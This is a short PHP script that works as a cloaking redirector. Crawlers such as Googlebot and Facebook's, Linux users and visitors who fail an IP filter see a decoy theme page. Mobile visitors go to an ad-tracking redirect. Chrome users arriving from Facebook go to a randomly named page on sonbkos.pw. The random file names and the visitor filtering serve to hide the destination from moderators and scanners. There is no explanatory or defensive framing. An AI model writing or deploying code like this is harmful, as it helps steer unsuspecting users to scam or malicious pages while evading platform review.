<?php
  $action = "theme";
  require_once('Mobile_Detect.php');
  require_once('Browser.php');
  $detect = new Mobile_Detect;
  $browser = new Browser();

  if($detect->isMobile() || $browser->isMobile()){
    $action = "mobile";
  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
    $action = "theme";
  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
    $action = "theme";
  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
    $action = "site";
  }

  if($action == "site"){
    $_SERVER["HTTP_REFERER"] = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
    $refs = array('facebook.com');
    $action = "theme";
    foreach ($refs as $ref) {
      if(strpos($_SERVER["HTTP_REFERER"], $ref) !== false){
        $action = "site";
        break;
      }
    }
  }

  if($action != "theme"){
    require_once("filter.php");
    $ipfilter = new IPFilter();
    $host_verify = $ipfilter->isValid();
    if($host_verify == false){
      $action = "theme";
    }
  }

  function generate_name($length){
      $rname = "";
      $sesli = "aeiou";
      $sessiz = "bcdfghjklmnprstvyz";
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }
  
  if($action == "mobile"){
    header("Location: http://tracking.redirect.pub/ad/41bc9048?d=1");
  }else if($action == "site"){
    $filename = generate_name(rand(5,8)).".html";
    header("Location:http://sonbkos.pw/".$filename);
  } else if ($action == "theme"){
    require_once("shr.php");
}
?>
